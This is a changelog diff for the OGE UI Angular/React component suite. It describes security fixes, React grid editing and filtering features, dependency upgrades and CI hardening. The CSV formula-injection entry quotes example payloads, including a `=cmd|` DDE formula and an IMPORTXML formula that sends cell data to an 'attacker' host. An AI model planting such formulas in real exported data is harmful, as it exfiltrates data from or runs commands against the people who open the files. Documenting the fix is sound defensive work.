@@ -5,6 +5,84 @@ Notable changes to the OGE UI packages. Versions are tagged per package
 Maintained by hand: `nx release` disables its workspace changelog when projects
 are versioned independently, which is the case here.
 
+## Unreleased — security hardening + React grid slices C/D
+
+### Fixed (security)
+
+- **CSV formula injection (CWE-1236) in every exporter.** `getCsv()` /
+  `exportCsv()` on the grid, tree list and pivot — and the clipboard TSV path
+  — quoted cells per RFC 4180 but left a cell opening with `=`, `+`, `-`, `@`,
+  tab or CR intact, so a spreadsheet evaluated it on open (`=cmd|…!A1`,
+  `=IMPORTXML("http://attacker/?"&A1)`). Those cells now carry a leading
+  apostrophe. Plain numbers are exempt, so a `-5` column stays numeric, and
+  `formulaGuard: false` opts out for machine-read output. The `.xlsx`
+  exporters write typed cells and were never affected.
+- **`javascript:` URLs executed from React `href`/`src` bindings.** Angular's
+  `[href]` sanitizes through `DomSanitizer`; React's does not, so a
+  data-driven `url` on a menu item, breadcrumb or menubar item ran on click in
+  the React layer only. `<OgeMenuList>`, `<OgeBreadcrumb>`, `<OgeMenubar>`,
+  the three select-family item images, the file uploader preview and the
+  uploader's own download anchor now route through the new `sanitizeUrl` /
+  `sanitizeResourceUrl` (exported from `@oge-ui/behavior`, for host code that
+  renders links from the same data).
+- **`<OgeCalendar>` (React) opened on the current month** instead of the month
+  of its bound value: the re-anchor effect only ran on a _later_ value change,
+  while Angular's `onValueWritten` runs for the initial write too. Only
+  visible outside the month a fixture was written in — which is why the spec
+  suite caught it in September and not in August.
+
+### Added
+
+- **`@oge-ui/react-grid` slices C and D.** Editing in all five modes —
+  `cell`, `row`, `batch`, `popup` and `form` (the last two through a real
+  `<OgeForm>`) — with the command column, the add/save/discard toolbar,
+  `addRow` / `editRow` / `deleteRow` / `saveChanges` / `discardChanges` /
+  `hasChanges` on the handle, the ten editing events, and per-column
+  `editable` / `required` / `validators` / `renderEditor`. Plus the Excel-style
+  header filter (dates grouped by year), the filter panel with the visual
+  filter builder (`<OgeFilterBuilderGroup>`), a controlled `filterValue`, the
+  column chooser (drag to reorder), column bands via `bandCaption`, row and
+  header context menus, `highlightChanges`, and deferred selection
+  (`selectionDeferred` / `selectionFilter`).
+
+  None of it is a reimplementation: `OgeGridEditingCore`'s editor bridge was
+  designed for this split — Angular fills it with `FormControl`s, React with
+  draft state — and the header-filter, filter-builder and selection kernels
+  are the same `@oge-ui/behavior` functions the Angular grid calls.
+
+- **`@oge-ui/react-grid/export-excel` and `/export-pdf`.**
+  `exportGridToExcel(handle, options)` and `exportGridToPdf(handle, options)`,
+  taking the grid's imperative handle where the Angular signature takes the
+  component. Getting there meant doing what the workspace's sharing rule asks
+  instead of the easy thing: the pure `buildExcelWorkbook` and
+  `buildPdfDocument` moved into the new `@oge-ui/behavior/export-excel` and
+  `@oge-ui/behavior/export-pdf` entry points — non-trivial and framework-free,
+  so extracted rather than copied — with `exceljs`, `jspdf` and
+  `jspdf-autotable` as optional peers there. `@oge-ui/grid/export-*` keeps its
+  download flow and re-exports the builder, so its public API is unchanged.
+
+  What is still outstanding before the React grid joins the parity gate is
+  documentation, not code: six feature pages still show the React shell notice
+  rather than branching.
+
+### Changed
+
+- Angular `22.0.6 → 22.1.5` (with the CLI/devkit at `22.1.7`), Nx
+  `23.1.0 → 23.2.0`, Vite `8.0.9 → 8.2.2`, esbuild `0.27 → 0.28`, plus `qs`
+  and `uuid` overrides — `npm audit` goes from 40 findings (27 high) to zero.
+  The high one that mattered was `@angular/platform-server`'s SSR XSS
+  (GHSA-vpx6-8pjr-4g3v), which the docs site prerenders through. The unused
+  `@angular-devkit/build-angular` direct dependency was dropped; the workspace
+  builds on `@angular/build` only.
+- CI gains an `audit` job (fails at moderate and above), a CodeQL
+  `security-extended` scan, and Dependabot with the Angular and Nx families
+  grouped so peer resolution never sees a partial bump.
+- The docs site sends a full security-header set (CSP, HSTS, frame-ancestors,
+  Permissions-Policy, COOP/CORP) and publishes `/.well-known/security.txt`.
+- `SECURITY.md` now states what the suite actually does with untrusted data —
+  including that upload validation is UX, not a server control — and
+  `docs/ARCHITECTURE.md` records the same rules as workspace invariants.
+
 ## 0.13.0 — 2026-08-23
 
 ### React layer: three more families
